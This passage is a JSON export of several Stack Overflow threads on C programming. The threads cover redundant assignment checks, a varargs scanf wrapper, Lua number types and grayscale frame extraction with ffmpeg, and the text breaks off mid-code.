"https://stackoverflow.com/users/1400817/werner-erasmus"}, "edited": false, "score": 0, "creation_date": 1457540008, "post_id": 35896646, "comment_id": 59454293, "body": "I had primitive types in mind. I did not consider the fact that it may have been volatile. Good point"}], "tags": [], "owner": {"reputation": 3356, "user_id": 4451432, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/97b46aba1c1ec6b780b9735f0ec7f885?s=128&d=identicon&r=PG&f=1", "display_name": "Ilya Popov", "link": "https://stackoverflow.com/users/4451432/ilya-popov"}, "is_accepted": false, "score": 1, "last_activity_date": 1457539871, "last_edit_date": 1457539871, "creation_date": 1457539529, "answer_id": 35896646, "question_id": 35896043, "link": "https://stackoverflow.com/questions/35896043/is-it-a-form-of-premature-pessimization-to-check-for-equality-prior-to-assignmen/35896646#35896646", "title": "Is it a form of premature pessimization to check for equality prior to assignment when applied to primitive types?", "body": "<p>There are several things to consider:</p>\n\n<ul>\n<li>Are the types involved primitive?</li>\n<li>If not, how expensive are comparison and assignment for those types?</li>\n<li>If yes, is this variable <code>volatile</code>?</li>\n</ul>\n\n<p>For primitive, non-volatile types the first option shall be faster. It is store vs. either load + comparison + branch or load + comparison + branch + store. For primitive types on modern processors, store takes almost the same time as load, so the first option is expected to be always faster.\nIt is especially so if the condition does not follow any regular pattern, and branch prediction would not work. In this case branch can take many cycles.</p>\n\n<p>For volatile variable, the choice depends on what semantics you need (is it a control register of some hardware where writing to memory location causes some action, transfer via network etc?)</p>\n\n<p>For classes, choice depends on the relative cost of comparison and assignment <em>and probability</em> of equality. In the first option, there is always an assignment. In the second option: if values are equal, there is only a comparison and branch; if not, comparison, branch, and assignment. </p>\n\n<p>In general, it is:</p>\n\n<pre><code>Ta vs. (Tc + Tb) * p + (Tc + Tb + Ta) * (1 - p)\n</code></pre>\n\n<p>where Ta is assignment time, Tc - comparison, Tb - branch (may be neglectable if the class is complex), p is probability of equal values. </p>\n\n<p>Also note, that some classes can contain this check in their assignment operator already.</p>\n"}, {"comments": [{"owner": {"reputation": 3682, "user_id": 1400817, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/666a05ea91a0a7e833c3e221a421a47a?s=128&d=identicon&r=PG", "display_name": "Werner Erasmus", "link": "https://stackoverflow.com/users/1400817/werner-erasmus"}, "edited": false, "score": 0, "creation_date": 1457544889, "post_id": 35898325, "comment_id": 59457780, "body": "Good point. Expecting many redundant assignments may then make the check worth while. I can think of scenarios where one does expect assignments to be mostly redundant."}], "tags": [], "owner": {"reputation": 64049, "user_id": 2015579, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/28571d6df35321850e78b1ebfd48e5b4?s=128&d=identicon&r=PG", "display_name": "Richard Hodges", "link": "https://stackoverflow.com/users/2015579/richard-hodges"}, "is_accepted": false, "score": 2, "last_activity_date": 1457544007, "creation_date": 1457544007, "answer_id": 35898325, "question_id": 35896043, "link": "https://stackoverflow.com/questions/35896043/is-it-a-form-of-premature-pessimization-to-check-for-equality-prior-to-assignmen/35898325#35898325", "title": "Is it a form of premature pessimization to check for equality prior to assignment when applied to primitive types?", "body": "<blockquote>\n  <p>using primitive types</p>\n</blockquote>\n\n<p>and</p>\n\n<blockquote>\n  <p>is it premature pessimization to just assign without checking whether necessary ?</p>\n</blockquote>\n\n<p>Worse. It's adding an un-necessary read, compare and conditional jump to what should have just been a write.</p>\n\n<blockquote>\n  <p>what about user-defined types?</p>\n</blockquote>\n\n<p>Let number of assignments expected = N</p>\n\n<p>Let number of times a redundant assignment is expected be U</p>\n\n<p>Let Cost of equality comparison = C</p>\n\n<p>Let Cost of assignment = A</p>\n\n<p>So the ratio of redundant assignments is R = U / N</p>\n\n<p>work we can save by checking = RNA</p>\n\n<p>cost of doing so = NC</p>\n\n<p>When invoking checking: Total cost of assignments = NC + (1-R)NA</p>\n\n<p>when not bothering to check: cost of assignments = NA</p>\n\n<p>so in order to determine whether it's worth checking for equality, we simply have to satisfy the inequality:</p>\n\n<p>NA > NC + NA - RNA</p>\n\n<p>NA - NC + NA > -RNA</p>\n\n<p>-NC > -RNA</p>\n\n<p>NC &lt;= RNA</p>\n\n<p>NC/NA &lt;= R</p>\n\n<p>C/A &lt;= R</p>\n\n<p>R > C / A</p>\n\n<p>So if the ratio expected number of redundant assignments is greater that the ratio of the cost of a check (compared to the cost of an assignment) then it's worth optimising.</p>\n\n<p>Can someone check my maths? It's been a while...</p>\n"}], "owner": {"reputation": 3682, "user_id": 1400817, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/666a05ea91a0a7e833c3e221a421a47a?s=128&d=identicon&r=PG", "display_name": "Werner Erasmus", "link": "https://stackoverflow.com/users/1400817/werner-erasmus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 185, "favorite_count": 0, "closed_date": 1457545987, "answer_count": 4, "score": 3, "last_activity_date": 1457544007, "creation_date": 1457537930, "last_edit_date": 1457538705, "question_id": 35896043, "link": "https://stackoverflow.com/questions/35896043/is-it-a-form-of-premature-pessimization-to-check-for-equality-prior-to-assignmen", "closed_reason": "Opinion-based", "title": "Is it a form of premature pessimization to check for equality prior to assignment when applied to primitive types?", "body": "<p>Having code that often modifies a non-local (member) variable (in a single threaded scenario, using primitive types), is it premature pessimization to just assign without checking whether necessary (considering that the modification of state has no other side effects as indicated in the code below)?</p>\n\n<p>e.g:</p>\n\n<pre><code>static int someState = 0;\nvoid foo(int newState)\n{\n  /* Which is better? This...*/\n  someState = newState; /*Assign regardless*/\n\n  /* ... or this... */\n  if (someState != newState)\n  {\n    someState = newState; /*Only write when required*/ \n  }\n}\n</code></pre>\n\n<p>I always feel the check is superfluous and would like to hear your opinions.</p>\n\n<ul>\n<li>Does the speed between reading and writing vary drastically to the point of considering the read check when the state change is made often?</li>\n<li>Is the extra check highly contextual?</li>\n</ul>\n\n<p>I might profile this, yes, but I'm wondering about community consensus concerning something like this. I mostly just perform the assignment regardless, and I'm wondering whether this is how its done mostly.</p>\n"}, {"tags": ["c", "input", "types", "scanf"], "comments": [{"owner": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "edited": false, "score": 1, "creation_date": 1457535040, "post_id": 35894739, "comment_id": 59450279, "body": "Look for a tutorial on C varargs. Note that this kind of error &quot;handling&quot; isn&#39;t actually very smart, so I hope you don&#39;t plan to use this in production."}, {"owner": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "edited": false, "score": 0, "creation_date": 1457537150, "post_id": 35894739, "comment_id": 59452007, "body": "The BIG probleme of your approach is &#39;how can you say for sure that a scanf fail ?&#39;. I mean, okay, if scan return -1, it&#39;s an error, but if scanf return 1 and you want to retrieve 2 variable with scanf, is it a failure for you ? Either you will have to parse format, or you will have to pass the exepected return of scanf. Or you can ignore this case."}, {"owner": {"reputation": 3409, "user_id": 3105485, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/b4c41125ff9c7b20ca07d0845e7af7ae?s=128&d=identicon&r=PG&f=1", "display_name": "Caridorc", "link": "https://stackoverflow.com/users/3105485/caridorc"}, "reply_to_user": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "edited": false, "score": 0, "creation_date": 1457537198, "post_id": 35894739, "comment_id": 59452047, "body": "@Tom&#39;s I will use it for one variable at a time so <code>!= 1</code> represents failure"}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 4, "last_activity_date": 1457538917, "last_edit_date": 1457538917, "creation_date": 1457534915, "answer_id": 35894823, "question_id": 35894739, "link": "https://stackoverflow.com/questions/35894739/writing-a-loud-failing-scanf-which-is-the-type-signature/35894823#35894823", "title": "Writing a loud failing scanf: which is the type signature?", "body": "<p>You need to use <a href=\"http://linux.die.net/man/3/stdarg\" rel=\"nofollow\">variable arguments</a> for this along with <code>vscanf</code>:</p>\n\n<pre><code>void aborting_scanf(const char *format, ...) {  \n  va_list ap;\n\n  va_start(ap, format);\n  if (vscanf(format, ap) != 1) {\n    puts(\"Invalid input\");\n    exit(1);\n  }\n  va_end(ap);\n}\n</code></pre>\n\n<p>The <code>...</code> argument tells the compiler that the remaining arguments are of varying types and numbers and can be anything.  The variable of type <code>va_list</code> allows you to access these values, and the <code>vscanf</code> function can read this directly.</p>\n"}, {"tags": [], "owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "is_accepted": false, "score": 1, "last_activity_date": 1457534928, "creation_date": 1457534928, "answer_id": 35894828, "question_id": 35894739, "link": "https://stackoverflow.com/questions/35894739/writing-a-loud-failing-scanf-which-is-the-type-signature/35894828#35894828", "title": "Writing a loud failing scanf: which is the type signature?", "body": "<p><code>scanf</code> uses a <em>variable argument list</em> as indicated by the <code>...</code> parameter. You manipulate these with the functions in <code>stdarg.h</code>. This format is not suitable to give a full introduction into variable argument lists, read a tutorial/book of choice about it.</p>\n"}], "owner": {"reputation": 3409, "user_id": 3105485, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/b4c41125ff9c7b20ca07d0845e7af7ae?s=128&d=identicon&r=PG&f=1", "display_name": "Caridorc", "link": "https://stackoverflow.com/users/3105485/caridorc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1457538917, "creation_date": 1457534693, "question_id": 35894739, "link": "https://stackoverflow.com/questions/35894739/writing-a-loud-failing-scanf-which-is-the-type-signature", "title": "Writing a loud failing scanf: which is the type signature?", "body": "<p>I decided to write a variation of the <code>scan</code> C function that instead of returning an <code>int</code> stating success or failure would print an error message and abort the program on error.</p>\n\n<pre><code>void aborting_scanf(const char *format, ???) {  \n  if (scanf(format, &amp;var) != 1)\n    puts(\"Invalid input\");\n    exit(1);\n}\n</code></pre>\n\n<p>The problem is what to write instead of the <code>???</code>, in <a href=\"http://linux.die.net/man/3/scanf\" rel=\"nofollow\">the man page</a>, the type signature is:</p>\n\n<pre><code>int scanf(const char *format, ...)\n</code></pre>\n\n<p>But then how can I name the target variable?</p>\n\n<p>In theory I could write a version for each type by hand but it would incredibly repetitive so I am looking for a more general solution to avoid code duplication.</p>\n"}, {"tags": ["c", "lua", "floating-point"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457534776, "post_id": 35894706, "comment_id": 59450065, "body": "It is <a href=\"http://pgl.yoyo.org/luai/i/lua_Number\" rel=\"nofollow noreferrer\">configurable</a>"}, {"owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457534907, "post_id": 35894706, "comment_id": 59450173, "body": "Thanks. Is it worth using doubles instead of floats ? I&#39;m creating very basic things that will mostly use integers, are occasionnally floats without requiring much precision like a physics engine would require."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457535069, "post_id": 35894706, "comment_id": 59450315, "body": "I think it depends on your requirements. But I don&#39;t think you will notice any performance degradation using <code>double</code> instead of <code>float</code> most of the times."}, {"owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457535219, "post_id": 35894706, "comment_id": 59450439, "body": "@EugeneSh. I&#39;m more concerned about unexpected behaviors with floats rather than performance, though that will run on rather weak embedded devices using Windows CE and Android. BUt I guess if the guys who ported Lua to WIndows CE made float a defaultn it should be used as is preferably."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457535298, "post_id": 35894706, "comment_id": 59450494, "body": "What unexpected behavior can you get out of using <code>double</code> which you won&#39;t from <code>float</code>?"}, {"owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457535414, "post_id": 35894706, "comment_id": 59450588, "body": "That&#39;s what they say about lua_Number that made me suspicious about floats : <a href=\"http://www.lua.org/pil/2.3.html\" rel=\"nofollow noreferrer\">lua.org/pil/2.3.html</a> Though I&#39;m not sure about what kind of problem to expect, if any."}, {"owner": {"reputation": 20428, "user_id": 1847592, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/OvYt2.png?s=128&g=1", "display_name": "Egor Skriptunoff", "link": "https://stackoverflow.com/users/1847592/egor-skriptunoff"}, "edited": false, "score": 0, "creation_date": 1457535577, "post_id": 35894706, "comment_id": 59450715, "body": "Floats (instead of doubles) are usually used on devices without FPU."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 20428, "user_id": 1847592, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/OvYt2.png?s=128&g=1", "display_name": "Egor Skriptunoff", "link": "https://stackoverflow.com/users/1847592/egor-skriptunoff"}, "edited": false, "score": 0, "creation_date": 1457535704, "post_id": 35894706, "comment_id": 59450816, "body": "@EgorSkriptunoff I&#39;ve encounterd the exact opposite cases, where FPUs were working for floats but not doubles."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457535902, "post_id": 35894706, "comment_id": 59450975, "body": "@Virus721 BTW, why are you working with <code>double</code> at all and not with <code>lua_Number</code> in the first place?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457536086, "post_id": 35894706, "comment_id": 59451146, "body": "A <code>double</code> cannot represent all bit of a <code>long int</code> with 64 bits (POSIX64)."}, {"owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "reply_to_user": {"reputation": 20428, "user_id": 1847592, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/OvYt2.png?s=128&g=1", "display_name": "Egor Skriptunoff", "link": "https://stackoverflow.com/users/1847592/egor-skriptunoff"}, "edited": false, "score": 0, "creation_date": 1457536250, "post_id": 35894706, "comment_id": 59451274, "body": "@EgorSkriptunoff Well I&#39;m storing some Lua values (primitives only) in my C code to make them available across multipe scripts. Using lua_Number is an option that hasn&#39;t come to my mind yet. I may consider doing this. But the values that i&#39;m storing in my C code are likely to be got/set by other things than Lua scripts so I don&#39;t know if I should use lua_Numbers."}], "answers": [{"comments": [{"owner": {"reputation": 20428, "user_id": 1847592, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/OvYt2.png?s=128&g=1", "display_name": "Egor Skriptunoff", "link": "https://stackoverflow.com/users/1847592/egor-skriptunoff"}, "edited": false, "score": 0, "creation_date": 1457536151, "post_id": 35895216, "comment_id": 59451200, "body": "&quot;It is instead a 64-bit integer.&quot; - it is configurable.  May be 32-bit integers."}, {"owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "edited": false, "score": 0, "creation_date": 1457536371, "post_id": 35895216, "comment_id": 59451378, "body": "Sorry, i misspelled, i&#39;m using Windows CE, my bad. Thanks for the help anyway."}, {"owner": {"reputation": 374829, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "reply_to_user": {"reputation": 20428, "user_id": 1847592, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/OvYt2.png?s=128&g=1", "display_name": "Egor Skriptunoff", "link": "https://stackoverflow.com/users/1847592/egor-skriptunoff"}, "edited": false, "score": 0, "creation_date": 1457536950, "post_id": 35895216, "comment_id": 59451823, "body": "@EgorSkriptunoff: As I said, they &quot;can be adjusted as you see fit.&quot;"}, {"owner": {"reputation": 374829, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "reply_to_user": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "edited": false, "score": 0, "creation_date": 1457536976, "post_id": 35895216, "comment_id": 59451851, "body": "@Virus721: I&#39;m not sure what using Windows CE has to do with anything here."}], "tags": [], "owner": {"reputation": 374829, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "is_accepted": false, "score": 2, "last_activity_date": 1457535863, "creation_date": 1457535863, "answer_id": 35895216, "question_id": 35894706, "link": "https://stackoverflow.com/questions/35894706/lua-are-numbers-floats-or-doubles/35895216#35895216", "title": "Lua - Are numbers floats or doubles?", "body": "<blockquote>\n  <p>I'm using Lua 5.3.2 for Windows.</p>\n</blockquote>\n\n<p>Well that rather changes things. Lua 5.3 added the ability to use actual integers in Lua, directly. Lua always had the <code>lua_pushinteger</code> function, but in 5.3, it <em>doesn't</em> convert it to a <code>double</code>. It is instead a 64-bit integer.</p>\n\n<p>From Lua of course, integers and floats look the same. And most of the Lua C API doesn't make much distinction. But it can if you want it to.</p>\n\n<p>In any case, <code>lua_Number</code> defaults to <code>double</code>, so even on Lua 5.1/2, integers-as-floats was not much of a problem. Of course, <code>lua_Integer</code> and <code>lua_Number</code> can be adjusted as you see fit. Just be aware that external DLLs you use have to be recompiled with those settings too.</p>\n"}], "owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5987, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1457536495, "creation_date": 1457534602, "last_edit_date": 1457536495, "question_id": 35894706, "link": "https://stackoverflow.com/questions/35894706/lua-are-numbers-floats-or-doubles", "title": "Lua - Are numbers floats or doubles?", "body": "<p>The Lua documentation says that Lua represents values of type number using a double, which allows all long integer values to be correctly represented using a floating point number.</p>\n\n<p>However I see in the code that lua_Number is actually a float. Which is giving me the following warning :</p>\n\n<pre><code>warning C4244: 'argument' : conversion from 'double' to 'lua_Number', possible loss of data\n</code></pre>\n\n<p>For :</p>\n\n<pre><code>double fVarVal = 0.0;\nlua_pushnumber( L, fVarVal );\n</code></pre>\n\n<p>So how are the values of type number represented in Lua ? float or double ? If they are using floats, can't this create problems when integer values, like array indexes, are being used ?</p>\n\n<p>I'm using Lua 5.3.2 for Windows CE.</p>\n"}, {"tags": ["c", "video", "ffmpeg", "libav"], "comments": [{"owner": {"reputation": 900, "user_id": 1587451, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ca143c644b5da7796f746de7bbaedb80?s=128&d=identicon&r=PG", "display_name": "user1587451", "link": "https://stackoverflow.com/users/1587451/user1587451"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457535324, "post_id": 35894522, "comment_id": 59450515, "body": "Updated my question and added an image. The image is distorted. The left part is added to the right, but the dimensions are still correct. Neither it&#39;s grayscale."}], "answers": [{"comments": [{"owner": {"reputation": 900, "user_id": 1587451, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ca143c644b5da7796f746de7bbaedb80?s=128&d=identicon&r=PG", "display_name": "user1587451", "link": "https://stackoverflow.com/users/1587451/user1587451"}, "edited": false, "score": 0, "creation_date": 1457541863, "post_id": 35897294, "comment_id": 59455602, "body": "Thanks, I&#39;ve edited like you wrote but now the inner part of the image is zoomed into the picture. Other image parts are cropped."}, {"owner": {"reputation": 16382, "user_id": 5507349, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/IaCUb.jpg?s=128&g=1", "display_name": "Edgar Rokj\u0101n", "link": "https://stackoverflow.com/users/5507349/edgar-rokj%c4%81n"}, "reply_to_user": {"reputation": 900, "user_id": 1587451, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ca143c644b5da7796f746de7bbaedb80?s=128&d=identicon&r=PG", "display_name": "user1587451", "link": "https://stackoverflow.com/users/1587451/user1587451"}, "edited": false, "score": 1, "creation_date": 1457551909, "post_id": 35897294, "comment_id": 59462254, "body": "@user1587451 just change <code>3 * width</code> to <code>width</code> in <code>fwrite</code> in <code>SaveFrame</code> function. It&#39;s just so to understand why is it necessary."}], "tags": [], "owner": {"reputation": 116, "user_id": 1638843, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3ec3cbb9cbd3d292c1abff8d93d1087?s=128&d=identicon&r=PG", "display_name": "kepstin", "link": "https://stackoverflow.com/users/1638843/kepstin"}, "is_accepted": true, "score": 2, "last_activity_date": 1457541167, "creation_date": 1457541167, "answer_id": 35897294, "question_id": 35894522, "link": "https://stackoverflow.com/questions/35894522/how-to-extract-grayscale-image-from-a-video-with-ffmpeg-library/35897294#35897294", "title": "How to extract grayscale image from a video with ffmpeg-library?", "body": "<p>Your main problem is here:</p>\n\n<pre><code>fprintf(pFile, \"P6\\n%d %d\\n255\\n\", width, height);\n</code></pre>\n\n<p>According to some info on PPM i found: <a href=\"http://paulbourke.net/dataformats/ppm/\" rel=\"nofollow\">http://paulbourke.net/dataformats/ppm/</a> you're writing the PPM header with the identifier <code>P6</code> which means \"rgb color\". If you're making a greyscale image, you want to use <code>P5</code> instead.</p>\n\n<p>As well, you're using the pixel format <code>PIX_FMT_GRAY16</code> from ffmpeg, but you're interpreting it as bytes. you probably meant to use <code>PIX_FMT_GRAY8</code> instead. If you actually want 16-bit grayscale in your output, you should change the third number in the PPM header from 255 to 65535.</p>\n"}], "owner": {"reputation": 900, "user_id": 1587451, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/ca143c644b5da7796f746de7bbaedb80?s=128&d=identicon&r=PG", "display_name": "user1587451", "link": "https://stackoverflow.com/users/1587451/user1587451"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1398, "favorite_count": 0, "accepted_answer_id": 35897294, "answer_count": 1, "score": 1, "last_activity_date": 1457541167, "creation_date": 1457534146, "last_edit_date": 1457535192, "question_id": 35894522, "link": "https://stackoverflow.com/questions/35894522/how-to-extract-grayscale-image-from-a-video-with-ffmpeg-library", "title": "How to extract grayscale image from a video with ffmpeg-library?", "body": "<p>I'v compiled and tested this <a href=\"http://dranger.com/ffmpeg/tutorial01.c\" rel=\"nofollow noreferrer\">tutorial</a> from <a href=\"http://dranger.com/ffmpeg/tutorial01.html\" rel=\"nofollow noreferrer\">here</a> which works just fine. After I tried to edit the tutorial to read/convert frames into <a href=\"https://ffmpeg.org/doxygen/2.7/pixfmt_8h.html#ace4d36d981b86af5f0dc2d6429701684\" rel=\"nofollow noreferrer\">grayscale</a>. I just changed <code>pFrameRGB</code> to <code>pFrameGray</code>, <code>PIX_FMT_RGB24</code> to <code>PIX_FMT_GRAY16</code> and to save just the 200th frame. It compiles and run but the image don't show the expected. What's wrong?</p>\n\n<p>The image:\n<a href=\"https://i.stack.imgur.com/2NpJR.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/2NpJR.png\" alt=\"image\"></a></p>\n\n<p>The edited code:</p>\n\n<pre><code>#include &lt;libavcodec/avcodec.h&gt;\n#include &lt;libavformat/avformat.h&gt;\n#include &lt;libswscale/swscale.h&gt;\n\n#include &lt;stdio.h&gt;\n\n// compatibility with newer API\n#if LIBAVCODEC_VERSION_INT &lt; AV_VERSION_INT(55,28,1)\n#define av_frame_alloc avcodec_alloc_frame\n#define av_frame_free avcodec_free_frame\n#endif\n\nvoid SaveFrame(AVFrame *pFrame, int width, int height, int iFrame) {\n  FILE *pFile;\n  char szFilename[32];\n  int  y;\n\n  // Open file\n  sprintf(szFilename, \"frame%d.ppm\", iFrame);\n  pFile=fopen(szFilename, \"wb\");\n  if(pFile==NULL)\n    return;\n\n  // Write header\n  fprintf(pFile, \"P6\\n%d %d\\n255\\n\", width, height);\n\n  // Write pixel data\n  for(y=0; y&lt;height; y++)\n    fwrite(pFrame-&gt;data[0]+y*pFrame-&gt;linesize[0], 1, width*3, pFile);\n\n  // Close file\n  fclose(pFile);\n}\n\nint main(int argc, char *argv[]) {\n  // Initalizing these to NULL prevents segfaults!\n  AVFormatContext   